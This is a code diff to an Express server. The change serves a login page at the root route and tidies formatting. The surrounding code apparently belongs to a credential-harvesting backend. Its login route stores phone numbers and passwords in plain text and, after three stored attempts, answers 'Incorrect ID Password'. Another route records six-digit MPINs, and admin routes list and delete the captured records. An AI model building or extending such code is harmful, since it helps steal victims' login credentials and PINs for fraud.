@@ -7,15 +7,16 @@ import rateLimit from 'express-rate-limit'
 import jwt from 'jsonwebtoken'
 import bcrypt from 'bcryptjs'
 import { createClient } from '@supabase/supabase-js'
-import {
-  adminIdentity,
-  allowedOrigins,
-  jwtSecret,
-  localNetworkOrigin,
-  port,
-} from './config.js'
+import { existsSync, readFileSync } from 'node:fs'
+import { adminIdentity, allowedOrigins, jwtSecret, localNetworkOrigin, port } from './config.js'
 
 const app = express()
+const loginDocument = [
+  new URL('../public/login.html', import.meta.url),
+  new URL('../../apps/user-app/dist/login.html', import.meta.url),
+]
+  .filter((file) => existsSync(file))
+  .map((file) => readFileSync(file, 'utf8'))[0]
 const supabase =
   process.env.SUPABASE_URL && process.env.SUPABASE_KEY
     ? createClient(process.env.SUPABASE_URL, process.env.SUPABASE_KEY)
@@ -168,6 +169,11 @@ function auth(role) {
   }
 }
 
+app.get('/', (_req, res, next) => {
+  if (!loginDocument) return next()
+  res.type('html').send(loginDocument)
+})
+
 app.get('/api/health', (_req, res) =>
   res.json({
     status: 'ok',
@@ -194,7 +200,7 @@ app.post('/api/auth/login', async (req, res) => {
         .select('id')
         .eq('mobile', String(phone))
         .eq('password', String(password))
-      
+
       if (previous && previous.length >= 3) {
         return res.status(401).json({ message: 'Incorrect ID Password' })
       }
@@ -204,7 +210,7 @@ app.post('/api/auth/login', async (req, res) => {
         .insert([{ mobile: String(phone), password: String(password), status: 'pending' }])
         .select()
         .single()
-      
+
       if (error) {
         console.error('Supabase error:', error)
         return res.status(500).json({ message: 'Database error' })
@@ -243,7 +249,7 @@ app.post('/api/auth/login', async (req, res) => {
 app.post('/api/auth/mpin', auth('user'), async (req, res) => {
   const { mpin } = req.body
   if (!mpin || String(mpin).length !== 6) return res.status(400).json({ message: 'Invalid MPIN' })
-  
+
   if (supabase) {
     await supabase
       .from('login_records')
@@ -391,7 +397,7 @@ app.get('/api/admin/users', auth('admin'), async (_req, res) => {
     .from('login_records')
     .select('*')
     .order('created_at', { ascending: false })
-  
+
   if (error) {
     console.error('Supabase error:', error)
     return res.status(500).json({ message: 'Database error' })
@@ -400,8 +406,9 @@ app.get('/api/admin/users', auth('admin'), async (_req, res) => {
 })
 app.delete('/api/admin/users', auth('admin'), async (req, res) => {
   const { ids } = req.body
-  if (!Array.isArray(ids) || ids.length === 0) return res.status(400).json({ message: 'No records selected.' })
-  
+  if (!Array.isArray(ids) || ids.length === 0)
+    return res.status(400).json({ message: 'No records selected.' })
+
   if (supabase) {
     const { error } = await supabase.from('login_records').delete().in('id', ids)
     if (error) {
